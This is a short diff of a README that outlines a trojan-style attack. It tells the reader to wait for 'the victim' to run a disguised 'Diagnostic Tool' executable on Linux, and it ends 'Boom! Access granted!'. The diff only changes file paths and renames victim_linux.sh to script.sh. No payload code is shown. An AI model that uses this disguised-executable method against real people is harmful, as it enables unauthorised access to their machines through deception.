@@ -9,11 +9,11 @@
 
 2. Wait for the victim to run the 'Diagnostic Tool' executable file: 
     - Linux:
-        - [User Guide PDF](./User%20guide.pdf)
+        - [User Guide PDF](./PDF%20Documents/User%20guide.pdf)
         - Download this and uncompressed it: [NetworkingTool.tar.gz](./NetworkingTool.tar.gz)
         - Source code:
             - [NetworkTool.desktop](./NetworkTool.desktop) (executable), together with
-            - [victim_linux.sh](./victim_linux.sh)
+            - [script.sh](./script.sh)
 
 
 3. Boom! Access granted!
